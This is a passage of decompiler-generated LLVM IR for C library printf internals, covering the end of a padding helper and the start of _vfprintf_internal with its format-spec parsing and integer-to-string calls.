  %v0_8051c70 = load i32, i32* @edi, align 4
  %v1_8051c70 = urem i32 %v0_8051c70, 128
  store i32 %v1_8051c70, i32* @edi, align 4
  store i32 %v2_8051c68, i32* @ecx, align 4
  store i32 %v1_8051c70, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_8051c7b = call i32 @_charpad()
  store i32 %v0_8051c7b, i32* @ebp, align 4
  %v12_8051c82 = icmp eq i32 %v0_8051c7b, %v2_8051c68
  %v1_8051c84 = icmp eq i1 %v12_8051c82, false
  br i1 %v1_8051c84, label %dec_label_pc_8051ca2, label %dec_label_pc_8051c70.dec_label_pc_8051c86_crit_edge

dec_label_pc_8051c70.dec_label_pc_8051c86_crit_edge: ; preds = %dec_label_pc_8051c70
  %v0_8051c86.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051c86

dec_label_pc_8051c86:                             ; preds = %dec_label_pc_8051c70.dec_label_pc_8051c86_crit_edge, %dec_label_pc_8051c59
  %v0_8051c86 = phi i32 [ %v0_8051c86.pre, %dec_label_pc_8051c70.dec_label_pc_8051c86_crit_edge ], [ %v3_8051c60, %dec_label_pc_8051c59 ]
  store i32 %v0_8051c86, i32* @ebx, align 4
  br label %dec_label_pc_8051c88

dec_label_pc_8051c88:                             ; preds = %entry, %dec_label_pc_8051c86
  %v0_8051c93 = phi i32 [ %arg3, %entry ], [ %v0_8051c86, %dec_label_pc_8051c86 ]
  %tmp24 = icmp slt i32 %v0_8051c93, 1
  br i1 %tmp24, label %dec_label_pc_8051ca0, label %dec_label_pc_8051c8e

dec_label_pc_8051c8e:                             ; preds = %dec_label_pc_8051c88
  %v0_8051c8e = load i32, i32* @ecx, align 4
  %v5_8051c98 = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_8051c93, i32 %arg1, i32 %v0_8051c8e)
  br label %dec_label_pc_8051ca0

dec_label_pc_8051ca0:                             ; preds = %dec_label_pc_8051c88, %dec_label_pc_8051c8e
  %v1_8051ca0 = phi i32 [ 0, %dec_label_pc_8051c88 ], [ %v5_8051c98, %dec_label_pc_8051c8e ]
  %v0_8051ca0 = load i32, i32* @ebp, align 4
  %v2_8051ca0 = add i32 %v0_8051ca0, %v1_8051ca0
  br label %dec_label_pc_8051ca2

dec_label_pc_8051ca2:                             ; preds = %dec_label_pc_8051c70, %dec_label_pc_8051ca0
  %v0_8051ca5 = phi i32 [ %v0_8051c7b, %dec_label_pc_8051c70 ], [ %v2_8051ca0, %dec_label_pc_8051ca0 ]
  ret i32 %v0_8051ca5

; uselistorder directives
  uselistorder i32 %v0_8051c93, { 1, 0 }
  uselistorder i32 %v0_8051c7b, { 1, 0, 2 }
  uselistorder i32 %v1_8051c70, { 1, 0 }
  uselistorder i32 %v2_8051c68, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051ca2, { 1, 0 }
  uselistorder label %dec_label_pc_8051ca0, { 1, 0 }
  uselistorder label %dec_label_pc_8051c88, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_8051cb6 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8051cb6, i32* @ebx, align 4
  %v2_8051cbe = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8051cbe, i32* @esi, align 4
  %v5_8051cc3 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_8051cb6)
  store i32 %v5_8051cc3, i32* %eax.global-to-local, align 4
  %v2_8051ccb = icmp slt i32 %v5_8051cc3, 0
  %v1_8051ccd = icmp eq i1 %v2_8051ccb, false
  br i1 %v1_8051ccd, label %dec_label_pc_8051d0d, label %dec_label_pc_8051ccf

dec_label_pc_8051ccf:                             ; preds = %entry
  %v3_8051ccf = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8051ccf, i32* @ebx, align 4
  %v5_8051cd6 = inttoptr i32 %v3_8051ccf to i8*
  %v3_8051cd7 = call i32 @strlen(i8* %v5_8051cd6)
  store i32 %v3_8051cd7, i32* %eax.global-to-local, align 4
  %v1_8051cdf = icmp eq i32 %v3_8051cd7, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_8051cdf, label %dec_label_pc_8052246, label %dec_label_pc_8051cee

dec_label_pc_8051cee:                             ; preds = %dec_label_pc_8051ccf
  %v0_8051cee = load i32, i32* @edx, align 4
  %v0_8051cf7 = load i32, i32* @ebx, align 4
  %v6_8051cf8 = call i32 @__stdio_fwrite(i32 %v0_8051cf7, i32 %v3_8051cd7, i32 %arg1, i32 %v0_8051cee)
  store i32 %v6_8051cf8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_8052246

dec_label_pc_8051d0d:                             ; preds = %entry
  %v6_8051d17 = call i32 @_ppfs_prepargs(i32 %v2_8051cbe, i32 %arg3, i32 %v5_8051cc3, i32 %v5_8051cc3)
  store i32 %v6_8051d17, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_8051d24 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d24, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051d2c

dec_label_pc_8051d2b:                             ; preds = %dec_label_pc_8051d32
  %v1_8051d2b = add i32 %v0_8051d3a, 1
  store i32 %v1_8051d2b, i32* @ebx, align 4
  br label %dec_label_pc_8051d2c.backedge

dec_label_pc_8051d2c.backedge:                    ; preds = %dec_label_pc_8051d2b, %dec_label_pc_805222c, %dec_label_pc_8052237
  %v1_8051d3619 = phi i32 [ %v1_8051d3e, %dec_label_pc_8051d2b ], [ %v3_805222c, %dec_label_pc_805222c ], [ %v1_8051d6a, %dec_label_pc_8052237 ]
  %v0_8051d2c17 = phi i32 [ %v1_8051d2b, %dec_label_pc_8051d2b ], [ %v3_805222c, %dec_label_pc_805222c ], [ %v1_8052237, %dec_label_pc_8052237 ]
  %v4_8051d2c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d2c

dec_label_pc_8051d2c:                             ; preds = %dec_label_pc_8051d2c.backedge, %dec_label_pc_8051d0d
  %v1_8051d3e = phi i32 [ %v1_8051d3619, %dec_label_pc_8051d2c.backedge ], [ %v0_8051d24, %dec_label_pc_8051d0d ]
  %v0_8051d3a = phi i32 [ %v0_8051d2c17, %dec_label_pc_8051d2c.backedge ], [ %v0_8051d24, %dec_label_pc_8051d0d ]
  %v4_8051d2c = phi i32 [ %v4_8051d2c.pre, %dec_label_pc_8051d2c.backedge ], [ %v6_8051d17, %dec_label_pc_8051d0d ]
  %v1_8051d2c = inttoptr i32 %v0_8051d3a to i8*
  %v2_8051d2c = load i8, i8* %v1_8051d2c, align 1
  %v3_8051d2c = zext i8 %v2_8051d2c to i32
  %v5_8051d2c = and i32 %v4_8051d2c, -256
  %v6_8051d2c = or i32 %v3_8051d2c, %v5_8051d2c
  store i32 %v6_8051d2c, i32* %eax.global-to-local, align 4
  %v4_8051d2e = icmp eq i8 %v2_8051d2c, 0
  br i1 %v4_8051d2e, label %dec_label_pc_8051d36, label %dec_label_pc_8051d32

dec_label_pc_8051d32:                             ; preds = %dec_label_pc_8051d2c
  %v10_8051d32 = icmp eq i8 %v2_8051d2c, 37
  %v1_8051d34 = icmp eq i1 %v10_8051d32, false
  br i1 %v1_8051d34, label %dec_label_pc_8051d2b, label %dec_label_pc_8051d36

dec_label_pc_8051d36:                             ; preds = %dec_label_pc_8051d32, %dec_label_pc_8051d2c
  %v2_8051d36 = sub i32 %v0_8051d3a, %v1_8051d3e
  %v12_8051d36 = icmp eq i32 %v2_8051d36, 0
  br i1 %v12_8051d36, label %dec_label_pc_8051d61, label %dec_label_pc_8051d3a

dec_label_pc_8051d3a:                             ; preds = %dec_label_pc_8051d36
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8051d36, i32* @esi, align 4
  %tmp66 = icmp slt i32 %v2_8051d36, 1
  br i1 %tmp66, label %dec_label_pc_8051d56, label %dec_label_pc_8051d44

dec_label_pc_8051d44:                             ; preds = %dec_label_pc_8051d3a
  %v0_8051d44 = load i32, i32* @ebp, align 4
  %v1_8051d44 = load i32, i32* @esp, align 4
  %v2_8051d44 = add i32 %v1_8051d44, -4
  %v3_8051d44 = inttoptr i32 %v2_8051d44 to i32*
  store i32 %v0_8051d44, i32* %v3_8051d44, align 4
  %v1_8051d45 = add i32 %v1_8051d44, 368
  %v2_8051d45 = inttoptr i32 %v1_8051d45 to i32*
  %v3_8051d45 = load i32, i32* %v2_8051d45, align 4
  %v5_8051d45 = add i32 %v1_8051d44, -8
  %v6_8051d45 = inttoptr i32 %v5_8051d45 to i32*
  store i32 %v3_8051d45, i32* %v6_8051d45, align 4
  %v0_8051d4c = load i32, i32* @esi, align 4
  %v2_8051d4c = add i32 %v1_8051d44, -12
  %v3_8051d4c = inttoptr i32 %v2_8051d4c to i32*
  store i32 %v0_8051d4c, i32* %v3_8051d4c, align 4
  %v0_8051d4d = load i32, i32* %edx.global-to-local, align 4
  %v2_8051d4d = add i32 %v1_8051d44, -16
  %v3_8051d4d = inttoptr i32 %v2_8051d4d to i32*
  store i32 %v0_8051d4d, i32* %v3_8051d4d, align 4
  %v0_8051d4e = load i32, i32* %stack_var_-364, align 4
  %v4_8051d4e = call i32 @__stdio_fwrite(i32 %v0_8051d4e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051d4e, i32* %eax.global-to-local, align 4
  %v1_8051d56.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051d56

dec_label_pc_8051d56:                             ; preds = %dec_label_pc_8051d3a, %dec_label_pc_8051d44
  %v3_8051d5e = phi i32 [ %v2_8051d36, %dec_label_pc_8051d3a ], [ %v1_8051d56.pre, %dec_label_pc_8051d44 ]
  %v0_8051d56 = phi i32 [ 0, %dec_label_pc_8051d3a ], [ %v4_8051d4e, %dec_label_pc_8051d44 ]
  %v12_8051d56 = icmp eq i32 %v0_8051d56, %v3_8051d5e
  %v1_8051d58 = icmp eq i1 %v12_8051d56, false
  %v0_805223f.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_8051d58, label %dec_label_pc_805223f, label %dec_label_pc_8051d5e

dec_label_pc_8051d5e:                             ; preds = %dec_label_pc_8051d56
  %v1_8051d5e = inttoptr i32 %v0_805223f.pre.pre to i32*
  %v2_8051d5e = load i32, i32* %v1_8051d5e, align 4
  %v4_8051d5e = add i32 %v2_8051d5e, %v3_8051d5e
  store i32 %v4_8051d5e, i32* %v1_8051d5e, align 4
  %v0_8051d61.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051d61

dec_label_pc_8051d61:                             ; preds = %dec_label_pc_8051d36, %dec_label_pc_8051d5e
  %v0_8052237 = phi i32 [ %v0_8051d3a, %dec_label_pc_8051d36 ], [ %v0_8051d61.pre, %dec_label_pc_8051d5e ]
  %v1_8051d61 = inttoptr i32 %v0_8052237 to i8*
  %v2_8051d61 = load i8, i8* %v1_8051d61, align 1
  %v3_8051d61 = icmp eq i8 %v2_8051d61, 0
  br i1 %v3_8051d61, label %dec_label_pc_8052246, label %dec_label_pc_8051d6a

dec_label_pc_8051d6a:                             ; preds = %dec_label_pc_8051d61
  %v1_8051d6a = add i32 %v0_8052237, 1
  store i32 %v1_8051d6a, i32* %edx.global-to-local, align 4
  %v2_8051d6d = inttoptr i32 %v1_8051d6a to i8*
  %v3_8051d6d = load i8, i8* %v2_8051d6d, align 1
  %v12_8051d6d = icmp eq i8 %v3_8051d6d, 37
  br i1 %v12_8051d6d, label %dec_label_pc_8052237, label %dec_label_pc_8051d77

dec_label_pc_8051d77:                             ; preds = %dec_label_pc_8051d6a
  %v1_8051d77 = load i32, i32* @esp, align 4
  %v2_8051d77 = add i32 %v1_8051d77, 16
  %v3_8051d77 = inttoptr i32 %v2_8051d77 to i32*
  store i32 %v1_8051d6a, i32* %v3_8051d77, align 4
  %v0_8051d7b = load i32, i32* @esp, align 4
  %v1_8051d7b = add i32 %v0_8051d7b, 340
  %v2_8051d7b = inttoptr i32 %v1_8051d7b to i32*
  store i32 0, i32* %v2_8051d7b, align 4
  %v0_8051d86 = load i32, i32* @esp, align 4
  %v1_8051d89 = add i32 %v0_8051d86, 16
  store i32 %v1_8051d89, i32* @ebx, align 4
  %v2_8051d8d = add i32 %v0_8051d86, -16
  %v3_8051d8d = inttoptr i32 %v2_8051d8d to i32*
  store i32 %v1_8051d89, i32* %v3_8051d8d, align 4
  %v0_8051d8e = load i32, i32* %stack_var_-364, align 4
  %v1_8051d8e = inttoptr i32 %v0_8051d8e to i32*
  %v2_8051d8e = call i32 @_ppfs_parsespec(i32* %v1_8051d8e)
  store i32 %v2_8051d8e, i32* %eax.global-to-local, align 4
  %v0_8051d93 = load i32, i32* @ebx, align 4
  %v1_8051d93 = load i32, i32* @esp, align 4
  %v2_8051d93 = inttoptr i32 %v1_8051d93 to i32*
  store i32 %v0_8051d93, i32* %v2_8051d93, align 4
  %v0_8051d96 = load i32, i32* %stack_var_-364, align 4
  %v1_8051d96 = call i32 @_ppfs_setargs(i32 %v0_8051d96)
  store i32 %v1_8051d96, i32* %eax.global-to-local, align 4
  %v0_8051d9b = load i32, i32* @esp, align 4
  %v1_8051d9b = add i32 %v0_8051d9b, 70
  %v2_8051d9b = inttoptr i32 %v1_8051d9b to i8*
  %v3_8051d9b = load i8, i8* %v2_8051d9b, align 1
  %v4_8051d9b = zext i8 %v3_8051d9b to i32
  store i32 %v4_8051d9b, i32* @edi, align 4
  %v1_8051da0 = add i32 %v0_8051d9b, 16
  %v1_8051da3 = add i32 %v0_8051d9b, 56
  %v2_8051da3 = inttoptr i32 %v1_8051da3 to i32*
  %v3_8051da3 = load i32, i32* %v2_8051da3, align 4
  %v1_8051da8 = add i32 %v0_8051d9b, 112
  store i32 %v1_8051da8, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_8051da3, 1
  br i1 %tmp67, label %dec_label_pc_8051db5, label %dec_label_pc_8051dae

dec_label_pc_8051dae:                             ; preds = %dec_label_pc_8051d77
  %v2_8051dae = zext i8 %v3_8051d9b to i32
  %v3_8051dae = mul nuw nsw i32 %v2_8051dae, 12
  store i32 %v3_8051dae, i32* %eax.global-to-local, align 4
  %v2_8051db1 = add i32 %v0_8051d9b, 100
  %v3_8051db1 = add i32 %v2_8051db1, %v3_8051dae
  store i32 %v3_8051db1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051db5

dec_label_pc_8051db5:                             ; preds = %dec_label_pc_8051d77, %dec_label_pc_8051dae
  %v0_8051dbd27 = phi i32 [ %v1_8051da8, %dec_label_pc_8051d77 ], [ %v3_8051db1, %dec_label_pc_8051dae ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8051db7 = add i32 %v0_8051d9b, 60
  %v2_8051db7 = inttoptr i32 %v1_8051db7 to i32*
  %v3_8051db7 = load i32, i32* %v2_8051db7, align 4
  store i32 %v3_8051db7, i32* %ecx.global-to-local, align 4
  %v2_8051dc880 = sub i32 0, %v3_8051db7
  %v10_8051dc883 = and i32 %v3_8051db7, %v2_8051dc880
  %v11_8051dc884 = icmp slt i32 %v10_8051dc883, 0
  %v13_8051dc885 = icmp slt i32 %v2_8051dc880, 0
  %v2_8051dca86 = icmp eq i1 %v13_8051dc885, %v11_8051dc884
  br i1 %v2_8051dca86, label %dec_label_pc_8051dcc, label %dec_label_pc_8051dbd

dec_label_pc_8051dbd:                             ; preds = %dec_label_pc_8051db5, %dec_label_pc_8051dbd
  %v0_8051dcc90 = phi i32 [ %v0_8051dcc, %dec_label_pc_8051dbd ], [ %v1_8051da0, %dec_label_pc_8051db5 ]
  %v2_8051dbd89 = phi i32 [ %v1_8051dc7, %dec_label_pc_8051dbd ], [ 0, %dec_label_pc_8051db5 ]
  %v0_8051dbd88 = phi i32 [ %v1_8051dc4, %dec_label_pc_8051dbd ], [ %v0_8051dbd27, %dec_label_pc_8051db5 ]
  %v3_8051dbd = mul i32 %v2_8051dbd89, 4
  %v4_8051dbd = add i32 %v0_8051dcc90, 344
  %v5_8051dbd = add i32 %v4_8051dbd, %v3_8051dbd
  %v6_8051dbd = inttoptr i32 %v5_8051dbd to i32*
  store i32 %v0_8051dbd88, i32* %v6_8051dbd, align 4
  %v0_8051dc4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051dc4 = add i32 %v0_8051dc4, 12
  store i32 %v1_8051dc4, i32* %edx.global-to-local, align 4
  %v0_8051dc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051dc7 = add i32 %v0_8051dc7, 1
  store i32 %v1_8051dc7, i32* %eax.global-to-local, align 4
  %v1_8051dc8.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051dc8 = sub i32 %v1_8051dc7, %v1_8051dc8.pre
  %v8_8051dc8 = xor i32 %v1_8051dc7, %v1_8051dc8.pre
  %v9_8051dc8 = xor i32 %v2_8051dc8, %v1_8051dc7
  %v10_8051dc8 = and i32 %v9_8051dc8, %v8_8051dc8
  %v11_8051dc8 = icmp slt i32 %v10_8051dc8, 0
  %v13_8051dc8 = icmp slt i32 %v2_8051dc8, 0
  %v2_8051dca = icmp eq i1 %v13_8051dc8, %v11_8051dc8
  %v0_8051dcc = load i32, i32* @esp, align 4
  br i1 %v2_8051dca, label %dec_label_pc_8051dcc, label %dec_label_pc_8051dbd

dec_label_pc_8051dcc:                             ; preds = %dec_label_pc_8051dbd, %dec_label_pc_8051db5
  %v0_8051dcc.lcssa = phi i32 [ %v1_8051da0, %dec_label_pc_8051db5 ], [ %v0_8051dcc, %dec_label_pc_8051dbd ]
  %v1_8051dcc = add i32 %v0_8051dcc.lcssa, 48
  %v2_8051dcc = inttoptr i32 %v1_8051dcc to i32*
  %v3_8051dcc = load i32, i32* %v2_8051dcc, align 4
  store i32 %v3_8051dcc, i32* @ecx, align 4
  %v1_8051dd0 = icmp eq i32 %v3_8051dcc, 0
  %v1_8051dd2 = icmp eq i1 %v1_8051dd0, false
  br i1 %v1_8051dd2, label %dec_label_pc_8051dfa, label %dec_label_pc_8051dd4

dec_label_pc_8051dd4:                             ; preds = %dec_label_pc_8051dcc
  %v1_8051dd4 = inttoptr i32 %v0_8051dcc.lcssa to i32*
  %v2_8051dd4 = load i32, i32* %v1_8051dd4, align 4
  store i32 %v2_8051dd4, i32* %eax.global-to-local, align 4
  %v1_8051dd7 = ashr i32 %v2_8051dd4, 31
  store i32 %v1_8051dd7, i32* %edx.global-to-local, align 4
  %v2_8051dd8 = add i32 %v0_8051dcc.lcssa, -4
  %v3_8051dd8 = inttoptr i32 %v2_8051dd8 to i32*
  store i32 %v1_8051dd7, i32* %v3_8051dd8, align 4
  %v0_8051dd9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051dd9 = add i32 %v0_8051dcc.lcssa, -8
  %v3_8051dd9 = inttoptr i32 %v2_8051dd9 to i32*
  store i32 %v0_8051dd9, i32* %v3_8051dd9, align 4
  %v1_8051dda = add i32 %v0_8051dcc.lcssa, 32
  %v2_8051dda = inttoptr i32 %v1_8051dda to i32*
  %v3_8051dda = load i32, i32* %v2_8051dda, align 4
  %v1_8051dde = and i32 %v3_8051dda, 3840
  store i32 %v1_8051dde, i32* %eax.global-to-local, align 4
  %v2_8051de3 = add i32 %v0_8051dcc.lcssa, -12
  %v3_8051de3 = inttoptr i32 %v2_8051de3 to i32*
  store i32 %v1_8051dde, i32* %v3_8051de3, align 4
  %v1_8051de4 = add i32 %v0_8051dcc.lcssa, 344
  %v2_8051de4 = inttoptr i32 %v1_8051de4 to i32*
  %v3_8051de4 = load i32, i32* %v2_8051de4, align 4
  store i32 %v3_8051de4, i32* %eax.global-to-local, align 4
  %v1_8051deb = inttoptr i32 %v3_8051de4 to i32*
  %v2_8051deb = load i32, i32* %v1_8051deb, align 4
  %v4_8051deb = add i32 %v0_8051dcc.lcssa, -16
  %v5_8051deb = inttoptr i32 %v4_8051deb to i32*
  store i32 %v2_8051deb, i32* %v5_8051deb, align 4
  %v0_8051ded = call i32 @_store_inttype()
  store i32 %v0_8051ded, i32* %eax.global-to-local, align 4
  %v0_8051df2 = load i32, i32* @esp, align 4
  %v1_8051df2 = add i32 %v0_8051df2, 16
  br label %dec_label_pc_805222c

dec_label_pc_8051dfa:                             ; preds = %dec_label_pc_8051dcc
  %tmp93 = icmp ult i32 %v3_8051dcc, 8
  br i1 %tmp93, label %dec_label_pc_8051e03, label %dec_label_pc_8051f64

dec_label_pc_8051e03:                             ; preds = %dec_label_pc_8051dfa
  %v1_8051e03 = add i32 %v3_8051dcc, 134598672
  %v2_8051e03 = inttoptr i32 %v1_8051e03 to i8*
  %v3_8051e03 = load i8, i8* %v2_8051e03, align 1
  %v4_8051e03 = sext i8 %v3_8051e03 to i32
  store i32 %v4_8051e03, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_8051e0f = icmp eq i8 %v3_8051e03, 10
  %v1_8051e12 = icmp eq i1 %v9_8051e0f, false
  br i1 %v1_8051e12, label %dec_label_pc_8051e30, label %dec_label_pc_8051e14

dec_label_pc_8051e14:                             ; preds = %dec_label_pc_8051e03
  %v1_8051e14 = add i32 %v0_8051dcc.lcssa, 32
  %v2_8051e14 = inttoptr i32 %v1_8051e14 to i32*
  %v3_8051e14 = load i32, i32* %v2_8051e14, align 4
  %v1_8051e1a = and i32 %v3_8051e14, 32
  store i32 %v1_8051e1a, i32* %eax.global-to-local, align 4
  %tmp68 = udiv i32 %v1_8051e1a, 32
  %tmp69 = sub nsw i32 45, %tmp68
  store i32 %tmp69, i32* @ebx, align 4
  %v1_8051e28 = trunc i32 %v3_8051e14 to i8
  %v2_8051e28 = and i8 %v1_8051e28, 64
  %v3_8051e28 = icmp eq i8 %v2_8051e28, 0
  %v5_8051e28 = zext i8 %v2_8051e28 to i32
  %v7_8051e28 = and i32 %v3_8051e14, -256
  %v8_8051e28 = or i32 %v5_8051e28, %v7_8051e28
  store i32 %v8_8051e28, i32* %edx.global-to-local, align 4
  br i1 %v3_8051e28, label %dec_label_pc_8051e30, label %dec_label_pc_8051e2d

dec_label_pc_8051e2d:                             ; preds = %dec_label_pc_8051e14
  %v2_8051e2d = or i32 %tmp69, 128
  store i32 %v2_8051e2d, i32* @ebx, align 4
  br label %dec_label_pc_8051e30

dec_label_pc_8051e30:                             ; preds = %dec_label_pc_8051e14, %dec_label_pc_8051e03, %dec_label_pc_8051e2d
  %tmp94 = icmp ult i32 %v3_8051dcc, 6
  br i1 %tmp94, label %dec_label_pc_8051e35, label %dec_label_pc_8051e4d

dec_label_pc_8051e35:                             ; preds = %dec_label_pc_8051e30
  %v9_8051e35 = icmp eq i32 %v3_8051dcc, 3
  %v1_8051e38 = icmp eq i1 %v9_8051e35, false
  br i1 %v1_8051e38, label %dec_label_pc_8051e41, label %dec_label_pc_8051e3a

dec_label_pc_8051e3a:                             ; preds = %dec_label_pc_8051e35
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_8051e4f

dec_label_pc_8051e41:                             ; preds = %dec_label_pc_8051e35
  %v9_8051e46 = icmp eq i32 %v3_8051dcc, 1
  br i1 %v9_8051e46, label %dec_label_pc_8051e54, label %dec_label_pc_8051e4f

dec_label_pc_8051e4d:                             ; preds = %dec_label_pc_8051e30
  %v1_8051e4d = sub nsw i32 0, %v4_8051e03
  store i32 %v1_8051e4d, i32* @esi, align 4
  br label %dec_label_pc_8051e4f

dec_label_pc_8051e4f:                             ; preds = %dec_label_pc_8051e41, %dec_label_pc_8051e3a, %dec_label_pc_8051e4d
  br label %dec_label_pc_8051e54

dec_label_pc_8051e54:                             ; preds = %dec_label_pc_8051e41, %dec_label_pc_8051e4f
  %storemerge105 = phi i32 [ 11, %dec_label_pc_8051e4f ], [ 6, %dec_label_pc_8051e41 ]
  store i32 %storemerge105, i32* @ebp, align 4
  %v1_8051e54 = add i32 %v0_8051dcc.lcssa, 7
  %v2_8051e54 = inttoptr i32 %v1_8051e54 to i8*
  store i8 32, i8* %v2_8051e54, align 1
  %v0_8051e59 = load i32, i32* @esp, align 4
  %v1_8051e59 = add i32 %v0_8051e59, 20
  %v2_8051e59 = inttoptr i32 %v1_8051e59 to i32*
  %v3_8051e59 = load i32, i32* %v2_8051e59, align 4
  %v5_8051e59 = icmp slt i32 %v3_8051e59, 0
  %v1_8051e5e = icmp eq i1 %v5_8051e59, false
  br i1 %v1_8051e5e, label %dec_label_pc_8051e68, label %dec_label_pc_8051e60

dec_label_pc_8051e60:                             ; preds = %dec_label_pc_8051e54
  %v1_8051e60 = add i32 %v0_8051e59, 36
  %v2_8051e60 = inttoptr i32 %v1_8051e60 to i8*
  %v3_8051e60 = load i8, i8* %v2_8051e60, align 1
  %v4_8051e60 = zext i8 %v3_8051e60 to i32
  %v5_8051e60 = load i32, i32* %edx.global-to-local, align 4
  %v6_8051e60 = and i32 %v5_8051e60, -256
  %v7_8051e60 = or i32 %v6_8051e60, %v4_8051e60
  store i32 %v7_8051e60, i32* %edx.global-to-local, align 4
  %v3_8051e64 = add i32 %v0_8051e59, 7
  %v4_8051e64 = inttoptr i32 %v3_8051e64 to i8*
  store i8 %v3_8051e60, i8* %v4_8051e64, align 1
  %v0_8051e68.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051e68

dec_label_pc_8051e68:                             ; preds = %dec_label_pc_8051e54, %dec_label_pc_8051e60
  %v1_8051e81 = phi i32 [ %v0_8051e59, %dec_label_pc_8051e54 ], [ %v0_8051e68.pre, %dec_label_pc_8051e60 ]
  %v1_8051e68 = add i32 %v1_8051e81, 344
  %v2_8051e68 = inttoptr i32 %v1_8051e68 to i32*
  %v3_8051e68 = load i32, i32* %v2_8051e68, align 4
  store i32 %v3_8051e68, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_8051e74 = add i32 %v3_8051dcc, -1
  %v8_8051e74 = icmp eq i32 %v1_8051e74, 0
  store i32 %v1_8051e74, i32* %ecx.global-to-local, align 4
  %v0_8051e81.pre = load i32, i32* @edi, align 4
  br i1 %v8_8051e74, label %dec_label_pc_8051e81, label %dec_label_pc_8051e77

dec_label_pc_8051e77:                             ; preds = %dec_label_pc_8051e68
  %v2_8051e77 = mul i32 %v0_8051e81.pre, 4
  %v3_8051e77 = add i32 %v1_8051e81, 52
  %v4_8051e77 = add i32 %v3_8051e77, %v2_8051e77
  %v5_8051e77 = inttoptr i32 %v4_8051e77 to i32*
  %v6_8051e77 = load i32, i32* %v5_8051e77, align 4
  %v1_8051e7b = and i32 %v6_8051e77, 3840
  store i32 %v1_8051e7b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051e81

dec_label_pc_8051e81:                             ; preds = %dec_label_pc_8051e68, %dec_label_pc_8051e77
  %v2_8051e81 = add i32 %v1_8051e81, -4
  %v3_8051e81 = inttoptr i32 %v2_8051e81 to i32*
  store i32 %v0_8051e81.pre, i32* %v3_8051e81, align 4
  %v0_8051e82 = load i32, i32* @esi, align 4
  %v2_8051e82 = add i32 %v1_8051e81, -8
  %v3_8051e82 = inttoptr i32 %v2_8051e82 to i32*
  store i32 %v0_8051e82, i32* %v3_8051e82, align 4
  %v0_8051e83 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051e83 = add i32 %v1_8051e81, -12
  %v3_8051e83 = inttoptr i32 %v2_8051e83 to i32*
  store i32 %v0_8051e83, i32* %v3_8051e83, align 4
  %v0_8051e84 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051e84 = add i32 %v1_8051e81, -16
  %v3_8051e84 = inttoptr i32 %v2_8051e84 to i32*
  store i32 %v0_8051e84, i32* %v3_8051e84, align 4
  %v0_8051e85 = call i32 @_load_inttype()
  %v0_8051e8a = load i32, i32* @ebx, align 4
  %v1_8051e8a = load i32, i32* @esp, align 4
  %v2_8051e8a = inttoptr i32 %v1_8051e8a to i32*
  store i32 %v0_8051e8a, i32* %v2_8051e8a, align 4
  %v0_8051e8d = load i32, i32* @esi, align 4
  %v1_8051e8d = load i32, i32* @esp, align 4
  %v2_8051e8d = add i32 %v1_8051e8d, -4
  %v3_8051e8d = inttoptr i32 %v2_8051e8d to i32*
  store i32 %v0_8051e8d, i32* %v3_8051e8d, align 4
  %v0_8051e8e = load i32, i32* @edx, align 4
  %v2_8051e8e = add i32 %v1_8051e8d, -8
  %v3_8051e8e = inttoptr i32 %v2_8051e8e to i32*
  store i32 %v0_8051e8e, i32* %v3_8051e8e, align 4
  %v2_8051e8f = add i32 %v1_8051e8d, -12
  %v3_8051e8f = inttoptr i32 %v2_8051e8f to i32*
  store i32 %v0_8051e85, i32* %v3_8051e8f, align 4
  %v1_8051e90 = add i32 %v1_8051e8d, 347
  store i32 %v1_8051e90, i32* %eax.global-to-local, align 4
  %v2_8051e97 = add i32 %v1_8051e8d, -16
  %v3_8051e97 = inttoptr i32 %v2_8051e97 to i32*
  store i32 %v1_8051e90, i32* %v3_8051e97, align 4
  %v0_8051e98 = load i32, i32* %stack_var_-364, align 4
  %v5_8051e98 = inttoptr i32 %v0_8051e98 to i8*
  %v6_8051e98 = call i32 @_uintmaxtostr(i8* %v5_8051e98, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
